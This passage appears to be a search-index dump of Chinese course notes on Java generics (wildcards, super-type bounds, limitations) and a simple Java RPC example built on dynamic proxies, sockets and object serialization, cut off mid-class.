max = arr.get(0); for(int i=1; i<arr.size(); i++){ if(arr.get(i).compareTo(max)>0){ max = arr.get(i); } } return max; } \u4e0a\u9762\u7684\u4ee3\u7801\u5c31\u96be\u4ee5\u7528\u901a\u914d\u7b26\u4ee3\u66ff\u3002 \u73b0\u5728\u6211\u4eec\u518d\u6765\u770b\u6cdb\u578b\u65b9\u6cd5\u5230\u5e95\u5e94\u8be5\u7528\u901a\u914d\u7b26\u7684\u5f62\u5f0f\u8fd8\u662f\u52a0\u7c7b\u578b\u53c2\u6570\u3002\u4e24\u8005\u5230\u5e95\u6709\u4ec0\u4e48\u5173\u7cfb\uff1f\u6211\u4eec\u603b\u7ed3\u5982\u4e0b\u3002 \u901a\u914d\u7b26\u5f62\u5f0f\u90fd\u53ef\u4ee5\u7528 \u7c7b\u578b\u53c2\u6570\u7684\u5f62\u5f0f \u6765\u66ff\u4ee3\uff0c\u901a\u914d\u7b26\u80fd\u505a\u7684\uff0c\u7528\u7c7b\u578b\u53c2\u6570\u90fd\u80fd\u505a\u3002 \u901a\u914d\u7b26\u5f62\u5f0f \u53ef\u4ee5\u51cf\u5c11\u7c7b\u578b\u53c2\u6570 \uff0c\u5f62\u5f0f\u4e0a\u5f80\u5f80 \u66f4\u4e3a\u7b80\u5355 \uff0c\u53ef\u8bfb\u6027\u4e5f\u66f4\u597d\uff0c\u6240\u4ee5\uff0c \u80fd\u7528\u901a\u914d\u7b26\u7684\u5c31\u7528\u901a\u914d\u7b26 \u3002 \u5982\u679c\u7c7b\u578b\u53c2\u6570\u4e4b\u95f4 \u6709\u4f9d\u8d56\u5173\u7cfb \uff0c\u6216\u8005 \u8fd4\u56de\u503c\u4f9d\u8d56\u7c7b\u578b\u53c2\u6570 \uff0c\u6216\u8005 \u9700\u8981\u5199\u64cd\u4f5c \uff0c\u5219 \u53ea\u80fd\u7528\u7c7b\u578b\u53c2\u6570 \u3002 \u901a\u914d\u7b26\u5f62\u5f0f\u548c\u7c7b\u578b\u53c2\u6570\u5f80\u5f80 \u914d\u5408\u4f7f\u7528 \uff0c\u6bd4\u5982\uff0c\u4e0a\u9762\u7684copy\u65b9\u6cd5\uff0c\u5b9a\u4e49\u5fc5\u8981\u7684\u7c7b\u578b\u53c2\u6570\uff0c\u4f7f\u7528\u901a\u914d\u7b26\u8868\u8fbe\u4f9d\u8d56\uff0c\u5e76\u63a5\u53d7\u66f4\u5e7f\u6cdb\u7684\u6570\u636e\u7c7b\u578b\u3002","title":"2.2.2. \u7406\u89e3\u901a\u914d\u7b26"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.Java%E4%B8%AD%E7%9A%84%E6%B3%9B%E5%9E%8B/#223","text":"\u8fd8\u6709\u4e00\u79cd\u901a\u914d\u7b26\uff0c\u4e0e\u5f62\u5f0f <\uff1fextends E> \u6b63\u597d\u76f8\u53cd\uff0c\u5b83\u7684\u5f62\u5f0f\u4e3a <\uff1fsuper E> \uff0c\u79f0\u4e3a \u8d85\u7c7b\u578b\u901a\u914d\u7b26 \uff0c\u8868\u793a E \u7684\u67d0\u4e2a \u7236\u7c7b\u578b \u3002\u5b83\u6709\u4ec0\u4e48\u7528\u5462\uff1f\u6709\u4e86\u5b83\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u66f4\u7075\u6d3b\u5730\u5199\u5165\u4e86\u3002 \u5982\u679c\u6ca1\u6709\u8fd9\u79cd\u8bed\u6cd5\uff0c\u5199\u5165\u4f1a\u6709\u4e00\u4e9b\u9650\u5236\u3002\u6765\u770b\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u7ed9 DynamicArray \u6dfb\u52a0\u4e00\u4e2a\u65b9\u6cd5\uff1a public void copyTo(DynamicArray<E> dest){ for(int i=0; i<size; i++){ dest.add(get(i)); } } \u8fd9\u4e2a\u65b9\u6cd5\u4e5f\u5f88\u7b80\u5355\uff0c\u5c06\u5f53\u524d\u5bb9\u5668\u4e2d\u7684\u5143\u7d20\u6dfb\u52a0\u5230\u4f20\u5165\u7684\u76ee\u6807\u5bb9\u5668\u4e2d\u3002\u6211\u4eec\u53ef\u80fd\u5e0c\u671b\u8fd9\u4e48\u4f7f\u7528\uff1a DynamicArray<Integer> ints = new DynamicArray<Integer>(); ints.add(100); ints.add(34); DynamicArray<Number> numbers = new DynamicArray<Number>(); ints.copyTo(numbers); Integer \u662f Number \u7684\u5b50\u7c7b\uff0c\u5c06 Integer \u5bf9\u8c61\u62f7\u8d1d\u5165 Number \u5bb9\u5668\uff0c\u8fd9\u79cd\u7528\u6cd5\u5e94\u8be5\u662f\u5408\u60c5\u5408\u7406\u7684\uff0c\u4f46 Java \u4f1a\u63d0\u793a\u7f16\u8bd1\u9519\u8bef\uff0c\u7406\u7531\u6211\u4eec\u4e4b\u524d\u4e5f\u8bf4\u8fc7\u4e86\uff0c\u671f\u671b\u7684\u53c2\u6570\u7c7b\u578b\u662f Dynamic-Array<Integer> \uff0c DynamicArray<Number> \u5e76\u4e0d\u9002\u7528\u3002 \u5982\u4e4b\u524d\u6240\u8bf4\uff0c\u4e00\u822c\u800c\u8a00\uff0c\u4e0d\u80fd\u5c06 DynamicArray<Integer> \u770b\u4f5c DynamicArray<Number> \uff0c\u4f46\u6211\u4eec\u8fd9\u91cc\u7684\u7528\u6cd5\u662f\u6ca1\u6709\u95ee\u9898\u7684\uff0c Java \u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u65b9\u6cd5\u5c31\u662f\u8d85\u7c7b\u578b\u901a\u914d\u7b26\uff0c\u53ef\u4ee5\u5c06copyTo\u4ee3\u7801\u6539\u4e3a\uff1a public void copyTo(DynamicArray<? super E> dest){ for(int i=0; i<size; i++){ dest.add(get(i)); } } \u8fd9\u6837\uff0c\u5c31\u6ca1\u6709\u95ee\u9898\u4e86\u3002 \u8d85\u7c7b\u578b\u901a\u914d\u7b26\u53e6\u4e00\u4e2a\u5e38\u7528\u7684\u573a\u5408\u662f Comparable/Comparator \u63a5\u53e3\u3002\u540c\u6837\uff0c\u6211\u4eec\u5148\u6765\u770b\u4e0b\u5982\u679c\u4e0d\u4f7f\u7528\u4f1a\u6709\u4ec0\u4e48\u9650\u5236\u3002\u4ee5\u524d\u9762\u8ba1\u7b97\u6700\u5927\u503c\u7684\u65b9\u6cd5\u4e3a\u4f8b\uff0c\u5b83\u7684\u65b9\u6cd5\u58f0\u660e\u662f\uff1a public static <T extends Comparable<T>> T max(DynamicArray<T> arr) \u8fd9\u4e2a\u58f0\u660e\u6709\u4ec0\u4e48\u9650\u5236\u5462\uff1f\u4e3e\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u6709\u4e24\u4e2a\u7c7b Base \u548c Child \uff0c Base \u7684\u4ee3\u7801\u662f\uff1a class Base implements Comparable<Base>{ private int sortOrder; public Base(int sortOrder) { this.sortOrder = sortOrder; } @Override public int compareTo(Base o) { if(sortOrder < o.sortOrder){ return -1; }else if(sortOrder > o.sortOrder){ return 1; }else{ return 0; } } } Base \u4ee3\u7801\u5f88\u7b80\u5355\uff0c\u5b9e\u73b0\u4e86 Comparable \u63a5\u53e3\uff0c\u6839\u636e\u5b9e\u4f8b\u53d8\u91cf sortOrder \u8fdb\u884c\u6bd4\u8f83\u3002 Child \u4ee3\u7801\u662f\uff1a class Child extends Base { public Child(int sortOrder) { super(sortOrder); } } \u8fd9\u91cc\uff0c Child \u975e\u5e38\u7b80\u5355\uff0c\u53ea\u662f\u7ee7\u627f\u4e86 Base \u3002\u6ce8\u610f\uff1a Child \u6ca1\u6709\u91cd\u65b0\u5b9e\u73b0 Comparable \u63a5\u53e3\uff0c\u56e0\u4e3a Child \u7684\u6bd4\u8f83\u89c4\u5219\u548c Base \u662f\u4e00\u6837\u7684\u3002\u6211\u4eec\u53ef\u80fd\u5e0c\u671b\u4f7f\u7528\u524d\u9762\u7684max\u65b9\u6cd5\u64cd\u4f5c Child \u5bb9\u5668\uff0c\u5982\u4e0b\u6240\u793a\uff1a DynamicArray<Child> childs = new DynamicArray<Child>(); childs.add(new Child(20)); childs.add(new Child(80)); Child maxChild = max(childs); \u9057\u61be\u7684\u662f\uff0c Java \u4f1a\u63d0\u793a\u7f16\u8bd1\u9519\u8bef\uff0c\u7c7b\u578b\u4e0d\u5339\u914d\u3002\u4e3a\u4ec0\u4e48\u4e0d\u5339\u914d\u5462\uff1f\u6211\u4eec\u53ef\u80fd\u4f1a\u8ba4\u4e3a\uff0c Java \u4f1a\u5c06 max \u65b9\u6cd5\u7684\u7c7b\u578b\u53c2\u6570 T \u63a8\u65ad\u4e3a Child \u7c7b\u578b\uff0c\u4f46\u7c7b\u578bT\u7684\u8981\u6c42\u662f extends Comparable<T> \uff0c\u800c Child \u5e76\u6ca1\u6709\u5b9e\u73b0 Comparable<Child> \uff0c\u5b83\u5b9e\u73b0\u7684\u662f Comparable<Base> \u3002 \u4f46\u6211\u4eec\u7684\u9700\u6c42\u662f\u5408\u7406\u7684\uff0cBase\u7c7b\u7684\u4ee3\u7801\u5df2\u7ecf\u6709\u4e86\u5173\u4e8e\u6bd4\u8f83\u6240\u9700\u8981\u7684\u5168\u90e8\u6570\u636e\uff0c\u5b83\u5e94\u8be5\u53ef\u4ee5\u7528\u4e8e\u6bd4\u8f83Child\u5bf9\u8c61\u3002\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u65b9\u6cd5\uff0c\u5c31\u662f\u4fee\u6539max\u7684\u65b9\u6cd5\u58f0\u660e\uff0c\u4f7f\u7528\u8d85\u7c7b\u578b\u901a\u914d\u7b26\uff0c\u5982\u4e0b\u6240\u793a\uff1a public static <T extends Comparable<? super T>> T max(DynamicArray<T> arr) \u8fd9\u4e48\u4fee\u6539\u4e00\u4e0b\u5c31\u53ef\u4ee5\u4e86\uff0c\u8fd9\u79cd\u5199\u6cd5\u6bd4\u8f83\u62bd\u8c61\uff0c\u5c06 T \u66ff\u6362\u4e3a Child \uff0c\u5c31\u662f\uff1a Child extends Comparable<? super Child> <\uff1fsuper Child> \u53ef\u4ee5\u5339\u914d Base \uff0c\u6240\u4ee5\u6574\u4f53\u5c31\u662f\u5339\u914d\u7684\u3002 \u6211\u4eec\u6bd4\u8f83\u4e00\u4e0b\u7c7b\u578b\u53c2\u6570\u9650\u5b9a\u4e0e\u8d85\u7c7b\u578b\u901a\u914d\u7b26\uff0c\u7c7b\u578b\u53c2\u6570\u9650\u5b9a\u53ea\u6709 extends \u5f62\u5f0f\uff0c\u6ca1\u6709 super \u5f62\u5f0f\uff0c\u6bd4\u5982\uff0c\u524d\u9762\u7684 copyTo\u65b9\u6cd5 \u7684\u901a\u914d\u7b26\u5f62\u5f0f\u7684\u58f0\u660e\u4e3a\uff1a public void copyTo(DynamicArray<? super E> dest) \u5982\u679c\u7c7b\u578b\u53c2\u6570\u9650\u5b9a\u652f\u6301 super \u5f62\u5f0f\uff0c\u5219\u5e94\u8be5\u662f\uff1a public <T super E> void copyTo(DynamicArray<T> dest) \u4e8b\u5b9e\u662f\uff0c Java \u5e76\u4e0d\u652f\u6301\u8fd9\u79cd\u8bed\u6cd5\u3002 \u524d\u9762\u6211\u4eec\u8bf4\u8fc7\uff0c\u5bf9\u4e8e\u6709\u9650\u5b9a\u7684\u901a\u914d\u7b26\u5f62\u5f0f <\uff1fextends E> \uff0c\u53ef\u4ee5\u7528\u7c7b\u578b\u53c2\u6570\u9650\u5b9a\u66ff\u4ee3\uff0c\u4f46\u662f\u5bf9\u4e8e\u7c7b\u4f3c\u4e0a\u9762\u7684\u8d85\u7c7b\u578b\u901a\u914d\u7b26\uff0c\u5219\u65e0\u6cd5\u7528\u7c7b\u578b\u53c2\u6570\u66ff\u4ee3\u3002","title":"2.2.3. \u8d85\u7c7b\u578b\u901a\u914d\u7b26"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.Java%E4%B8%AD%E7%9A%84%E6%B3%9B%E5%9E%8B/#224","text":"\u672c\u8282\u4ecb\u7ecd\u4e86\u6cdb\u578b\u4e2d\u7684\u4e09\u79cd\u901a\u914d\u7b26\u5f62\u5f0f <\uff1f> \u3001 <\uff1fsuper E> \u548c <\uff1fextends E> \uff0c\u5e76\u5206\u6790\u4e86\u4e0e\u7c7b\u578b\u53c2\u6570\u5f62\u5f0f\u7684\u533a\u522b\u548c\u8054\u7cfb\uff0c\u5b83\u4eec\u6bd4\u8f83\u5bb9\u6613\u6df7\u6dc6\uff0c\u6211\u4eec\u603b\u7ed3\u6bd4\u8f83\u5982\u4e0b\uff1a \u5b83\u4eec\u7684\u76ee\u7684\u90fd\u662f\u4e3a\u4e86\u4f7f\u65b9\u6cd5\u63a5\u53e3\u66f4\u4e3a\u7075\u6d3b\uff0c\u53ef\u4ee5\u63a5\u53d7\u66f4\u4e3a\u5e7f\u6cdb\u7684\u7c7b\u578b\u3002 <\uff1fsuper E> \u7528\u4e8e\u7075\u6d3b\u5199\u5165\u6216\u6bd4\u8f83\uff0c\u4f7f\u5f97\u5bf9\u8c61\u53ef\u4ee5\u5199\u5165\u7236\u7c7b\u578b\u7684\u5bb9\u5668\uff0c\u4f7f\u5f97\u7236\u7c7b\u578b\u7684\u6bd4\u8f83\u65b9\u6cd5\u53ef\u4ee5\u5e94\u7528\u4e8e\u5b50\u7c7b\u5bf9\u8c61\uff0c\u5b83\u4e0d\u80fd\u88ab\u7c7b\u578b\u53c2\u6570\u5f62\u5f0f\u66ff\u4ee3\u3002 <\uff1f> \u548c <\uff1fextends E> \u7528\u4e8e\u7075\u6d3b\u8bfb\u53d6\uff0c\u4f7f\u5f97\u65b9\u6cd5\u53ef\u4ee5\u8bfb\u53d6E\u6216E\u7684\u4efb\u610f\u5b50\u7c7b\u578b\u7684\u5bb9\u5668\u5bf9\u8c61\uff0c\u5b83\u4eec\u53ef\u4ee5\u7528\u7c7b\u578b\u53c2\u6570\u7684\u5f62\u5f0f\u66ff\u4ee3\uff0c\u4f46\u901a\u914d\u7b26\u5f62\u5f0f\u66f4\u4e3a\u7b80\u6d01\u3002 Java \u5bb9\u5668\u7c7b\u7684\u5b9e\u73b0\u4e2d\uff0c\u6709\u5f88\u591a\u4f7f\u7528\u901a\u914d\u7b26\u7684\u4f8b\u5b50\uff0c\u6bd4\u5982\uff0c\u7c7b Collections \u4e2d\u5c31\u6709\u5982\u4e0b\u65b9\u6cd5\uff1a public static <T extends Comparable<? super T>> void sort(List<T> list) public static <T> void sort(List<T> list, Comparator<? super T> c) public static <T> void copy(List<? super T> dest, List<? extends T> src) public static <T> T max(Collection<? extends T> coll, Comparator<? super T> comp)","title":"2.2.4. \u901a\u914d\u7b26\u6bd4\u8f83"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.Java%E4%B8%AD%E7%9A%84%E6%B3%9B%E5%9E%8B/#23","text":"\u6cdb\u578b\u4e5f\u5b58\u5728\u4e00\u4e9b\u5c40\u9650\u6027\uff0c\u8fd9\u4e9b\u5c40\u9650\u6027\u4e3b\u8981\u662f\u7531\u4e8e Java \u6cdb\u578b\u7684\u5b9e\u73b0\u673a\u5236\u5f15\u8d77\u7684\uff0c\u8fd9\u4e9b\u5c40\u9650\u6027\u5305\u62ec\uff1a \u4e0d\u80fd\u4f7f\u7528\u57fa\u672c\u7c7b\u578b \u6ca1\u6709\u8fd0\u884c\u65f6\u7c7b\u578b\u4fe1\u606f \u7c7b\u578b\u64e6\u9664\u4f1a\u5f15\u53d1\u4e00\u4e9b\u51b2\u7a81 \u4e0d\u80fd\u901a\u8fc7\u7c7b\u578b\u53c2\u6570\u521b\u5efa\u5bf9\u8c61 \u4e0d\u80fd\u7528\u4e8e\u9759\u6001\u53d8\u91cf \u4e0d\u80fd\u521b\u5efa\u6cdb\u578b\u6570\u7ec4\uff0c\u9700\u8981\u901a\u8fc7\u6cdb\u578b\u5bb9\u5668\u6765\u5b9e\u73b0\u6570\u7ec4\u529f\u80fd \u6211\u4eec\u9700\u8981\u7406\u89e3\u8fd9\u4e9b\u5c40\u9650\u6027\uff0c\u5e78\u8fd0\u7684\u662f\uff0c\u4e00\u822c\u5e76\u4e0d\u9700\u8981\u7279\u522b\u53bb\u8bb0\u5fc6\uff0c\u56e0\u4e3a\u7528\u9519\u7684\u65f6\u5019\uff0c Java \u5f00\u53d1\u73af\u5883\u548c\u7f16\u8bd1\u5668\u4f1a\u8fdb\u884c\u63d0\u793a\uff0c\u5f53\u88ab\u63d0\u793a\u65f6\u80fd\u591f\u7406\u89e3\u5e76\u4ece\u5bb9\u5e94\u5bf9\u5373\u53ef\u3002","title":"2.3. \u7ec6\u8282\u548c\u5c40\u9650\u6027"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.Java%E4%B8%AD%E7%9A%84%E6%B3%9B%E5%9E%8B/#3","text":"[1] \u9a6c\u4fca\u660c. Java \u7f16\u7a0b\u7684\u903b\u8f91 [M]. \u5317\u4eac : \u673a\u68b0\u5de5\u4e1a\u51fa\u7248\u793e, 2018. \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u53c2\u8003\u6587\u732e"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.Java%E4%B8%AD%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8%28RPC%29/","text":"Java\u4e2d\u7684\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528(RPC) # \u76ee\u5f55 # Java\u4e2d\u7684\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528(RPC) \u76ee\u5f55 1. \u80cc\u666f 2. \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u7684\u5b9a\u4e49 3. \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u7684\u4f18\u70b9 4. \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u7684\u7f3a\u70b9 5. \u5b9e\u4f8b 5.1. \u5ba2\u6237\u7aef 5.1.1. \u5ba2\u6237\u7aef\u5b9e\u73b0 5.1.2. \u52a8\u6001\u4ee3\u7406\u7c7b 5.1.3. \u8fde\u63a5\u5668 5.2. \u8fdc\u7a0b\u5bf9\u8c61 5.3. \u670d\u52a1\u7aef 6. \u53c2\u8003\u6587\u732e 1. \u80cc\u666f # \u8fd9\u5b66\u671f\u4e0a\u4e86\u300a\u5206\u5e03\u5f0f\u7cfb\u7edf\u300b\u8bfe\u7a0b\uff0c\u5185\u5bb9\u4e3b\u8981\u662f\u57fa\u4e8eJava\u5b9e\u73b0\u5206\u5e03\u5f0f\u8ba1\u7b97\uff0c\u6240\u4ee5\u8001\u5e08\u524d\u51e0\u8282\u8bfe\u4e3b\u8981\u5728\u7ed9\u6211\u4eec\u8bb2\u7528Java\u505a\u5206\u5e03\u5f0f\u53ef\u80fd\u4f1a\u7528\u5230\u7684\u4e00\u4e9b\u6280\u672f\u3002\u4e3a\u4e86\u65b9\u4fbf\u5b66\u4e60\u548c\u8bb0\u5f55\uff0c\u6211\u5c06\u8001\u5e08\u8bb2\u7684\u5185\u5bb9\u7ed3\u5408\u4e66\u7c4d\u548c\u8d44\u6599\u505a\u4e86\u4e00\u4e9b\u6574\u7406\uff0c\u8fd9\u4e00\u7bc7\u4e3b\u8981\u8ba8\u8bba\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u3002 2. \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u7684\u5b9a\u4e49 # \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u662f\u4e00\u79cd\u8fdb\u7a0b\u95f4\u901a\u4fe1\u6280\u672f\uff0c\u7528\u4e8e\u57fa\u4e8e\u5ba2\u6237\u7aef-\u670d\u52a1\u5668\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u5b83\u4e5f\u88ab\u79f0\u4e3a\u5b50\u4f8b\u7a0b\u8c03\u7528\u6216\u51fd\u6570\u8c03\u7528\u3002 \u5ba2\u6237\u7aef\u6709\u4e00\u4e2a\u8bf7\u6c42\u6d88\u606f\uff0cRPC\u5c06\u5176\u8f6c\u6362\u5e76\u53d1\u9001\u7ed9\u670d\u52a1\u5668\u3002\u6b64\u8bf7\u6c42\u53ef\u4ee5\u662f\u5bf9\u8fdc\u7a0b\u670d\u52a1\u5668\u7684\u8fc7\u7a0b\u6216\u51fd\u6570\u8c03\u7528\u3002\u5f53\u670d\u52a1\u5668\u63a5\u6536\u5230\u8bf7\u6c42\u65f6\uff0c\u5b83\u5c06\u6240\u9700\u7684\u54cd\u5e94\u53d1\u9001\u56de\u5ba2\u6237\u673a\u3002\u5ba2\u6237\u7aef\u5728\u670d\u52a1\u5668\u5904\u7406\u8c03\u7528\u65f6\u88ab\u963b\u585e\uff0c\u53ea\u6709\u5728\u670d\u52a1\u5668\u5b8c\u6210\u540e\u624d\u6062\u590d\u6267\u884c\u3002 1 \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u7684\u987a\u5e8f\u5982\u4e0b: \u5ba2\u6237\u7aef\u5b58\u6839\u7531\u5ba2\u6237\u7aef\u8c03\u7528\u3002 \u5ba2\u6237\u7aef\u5b58\u6839\u53d1\u51fa\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u5c06\u6d88\u606f\u53d1\u9001\u5230\u670d\u52a1\u5668\uff0c\u5e76\u5c06\u53c2\u6570\u653e\u5165\u6d88\u606f\u4e2d\u3002 \u5ba2\u6237\u7aef\u64cd\u4f5c\u7cfb\u7edf\u5c06\u6d88\u606f\u4ece\u5ba2\u6237\u7aef\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002 \u6d88\u606f\u7531\u670d\u52a1\u5668\u64cd\u4f5c\u7cfb\u7edf\u4f20\u9012\u5230\u670d\u52a1\u5668\u5b58\u6839\u3002 \u670d\u52a1\u5668\u5b58\u6839\u4ece\u6d88\u606f\u4e2d\u5220\u9664\u53c2\u6570\u3002 \u7136\u540e\uff0c\u670d\u52a1\u5668\u5b58\u6839\u8c03\u7528\u670d\u52a1\u5668\u6267\u884c\u64cd\u4f5c\u3002 \u6267\u884c\u5b8c\u6210\u540e\uff0c\u7ed3\u679c\u539f\u8def\u8fd4\u56de\u5230\u5ba2\u6237\u7aef\u3002 \u8fc7\u7a0b\u5982\u4e0b\u56fe\u6240\u793a 3. \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u7684\u4f18\u70b9 # RPC\u7684\u4e00\u4e9b\u4f18\u70b9\u5982\u4e0b: \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u652f\u6301\u9762\u5411\u8fc7\u7a0b\u548c\u9762\u5411\u7ebf\u7a0b\u7684\u6a21\u578b\u3002 RPC\u7684\u5185\u90e8\u6d88\u606f\u4f20\u9012\u673a\u5236\u5bf9\u7528\u6237\u9690\u85cf\u3002\u91cd\u5199\u548c\u91cd\u65b0\u5f00\u53d1\u4ee3\u7801\u7684\u5de5\u4f5c\u91cf\u5728\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u4e2d\u662f\u6700\u5c0f\u7684\u3002 \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u53ef\u4ee5\u5728\u5206\u5e03\u5f0f\u73af\u5883\u4e2d\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u5728\u672c\u5730\u73af\u5883\u4e2d\u4f7f\u7528\u3002 \u4e3a\u4e86\u63d0\u9ad8\u6027\u80fd\uff0cRPC\u7701\u7565\u4e86\u8bb8\u591a\u534f\u8bae\u5c42\u3002 4. \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u7684\u7f3a\u70b9 # RPC\u7684\u4e00\u4e9b\u7f3a\u70b9\u5982\u4e0b: \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u662f\u4e00\u4e2a\u53ef\u4ee5\u7528\u4e0d\u540c\u65b9\u5f0f\u5b9e\u73b0\u7684\u6982\u5ff5\u3002\u5b83\u4e0d\u662f\u4e00\u4e2a\u6807\u51c6\u3002 RPC\u5bf9\u4e8e\u786c\u4ef6\u67b6\u6784\u6ca1\u6709\u7075\u6d3b\u6027\u3002\u5b83\u53ea\u57fa\u4e8e\u4ea4\u4e92\u3002 \u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\u800c\u589e\u52a0\u4e86\u6210\u672c\u3002 5. \u5b9e\u4f8b # Java \u4e2d\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u53cd\u5c04\u673a\u5236\u548c\u52a8\u6001\u4ee3\u7406\u6765\u5b9e\u73b0\u4e00\u4e2aRPC\u6846\u67b6\u3002 5.1. \u5ba2\u6237\u7aef # 5.1.1. \u5ba2\u6237\u7aef\u5b9e\u73b0 # package service; import rpc.DynamicProxyFactory; import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; public class clienTest { static void test(int threadId) { // \u8fd9\u91cc\u5b9e\u73b0\u4e86\u4e00\u4e2a\u767b\u9646\u7684\u64cd\u4f5c // \u5b9e\u73b0\u7ec6\u8282\u5e76\u4e0d\u91cd\u8981\uff0c\u6240\u4ee5\u6ca1\u6709\u7ed9\u51fa loginService \u7684\u4ee3\u7801 // \u901a\u8fc7\u52a8\u6001\u4ee3\u7406\u4e0e\u670d\u52a1\u5668\u5efa\u7acb\u8fde\u63a5 loginService loginservice = DynamicProxyFactory.getProxy(loginService.class, \"localhost\", 8000); // \u6267\u884c\u8fdc\u7a0b\u64cd\u4f5c String Result = loginservice.login(\"123\", \"123\"); // \u8f93\u51fa\u7ed3\u679c System.out.println(String.format(\"Client Thread %d result= %s\",threadId, Result)); } public static void main(String[] args) throws Exception { int threadNum = 4; // \u521b\u5efa\u591a\u7ebf\u7a0b ExecutorService executor = Executors.newFixedThreadPool(4); // \u591a\u7ebf\u7a0b\u8c03\u7528 for (int i = 0; i < 4; i++) { int finalI = i; executor.submit(() -> { test(finalI + 1); }); } } } 5.1.2. \u52a8\u6001\u4ee3\u7406\u7c7b # package rpc; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; // \u52a8\u6001\u4ee3\u7406\u7c7b public class DynamicProxyFactory { @SuppressWarnings(\"unchecked\") public static <T> T getProxy(final Class<T> classType, final String host, final int port) {//\u6cdb\u578b\u65b9\u6cd5\uff0c\u4f20\u5165\u4ec0\u4e48\u7c7b\u578b\u8fd4\u56de\u4ec0\u4e48\u7c7b\u578b InvocationHandler handler = (proxy, method, args) -> { Connector connector = null; try { connector = new Connector(host, port); RemoteCall call = new RemoteCall(classType.getName(), method.getName(), method.getParameterTypes(), args); connector.send(call); call = (RemoteCall) connector.receive(); return call.getResult(); } finally { if (connector != null) connector.close(); } }; System.out.println(\"\u4ee3\u7406\u5f00\u59cb\u6267\u884c\"); return (T) Proxy.newProxyInstance(classType.getClassLoader(),new Class<?>[]{classType}, handler); } } 5.1.3. \u8fde\u63a5\u5668 # package rpc; import java.io.InputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.OutputStream; import java.net.Socket; public class Connector { private String host; private int port; private Socket skt; private InputStream is; private ObjectInputStream ois; private OutputStream os; private ObjectOutputStream oos; public Connector(String host, int port) throws Exception { this.host = host; this.port = port; connect(host, port); } // \u53d1\u9001\u5bf9\u8c61\u65b9\u6cd5 public void send(Object obj) throws Exception { oos.writeObject(obj); } // \u63a5\u6536\u5bf9\u8c61\u65b9\u6cd5 public Object receive() throws Exception { return ois.readObject(); } // \u5efa\u7acb\u4e0e\u8fdc\u7a0b\u670d\u52a1\u5668\u7684\u8fde\u63a5 public void connect() throws Exception { connect(host, port); } // \u5efa\u7acb\u4e0e\u8fdc\u7a0b\u670d\u52a1\u5668\u7684\u8fde\u63a5 public void connect(String host, int port) throws Exception { skt = new Socket(host, port); os = skt.getOutputStream(); oos = new ObjectOutputStream(os); is = skt.getInputStream(); ois = new ObjectInputStream(is); } // \u5173\u95ed\u8fde\u63a5 public void close() { try { ois.close(); oos.close(); skt.close(); } catch (Exception e) { System.out.println(\" Conector.close :\" + e); } } } 5.2. \u8fdc\u7a0b\u5bf9\u8c61 # package rpc; import java.io.Serializable; //\u76f8\u5f53\u4e8e\u4e00\u4e2ajavaBean public class RemoteCall implements Serializable { private static final long serialVersionUID = 1L; private String className;// \u8868\u793a\u670d\u52a1\u7c7b\u540d\u6216\u63a5\u53e3\u540d private String methodName; // \u8868\u793a\u529f\u80fd\u65b9\u6cd5\u540d private Class<?>[] paramTypes;//\u8868\u793a\u65b9\u6cd5\u53c2\u6570\u7c7b\u578b private Object[] params;//\u8868\u793a\u65b9\u6cd5\u53c2\u6570\u503c/\u5982\u679c\u65b9\u6cd5\u6b63\u5e38\u6267\u884c\uff0c\u5219resul \u4e3a\u65b9\u6cd5\u8fd4\u56de\u503c\uff0c\u5982\u679c\u65b9\u6cd5\u629b\u51fa\u5f02\u5e38\uff0c\u5219resul \u4e3a\u8be5\u5f02\u5e38 private Object result; public 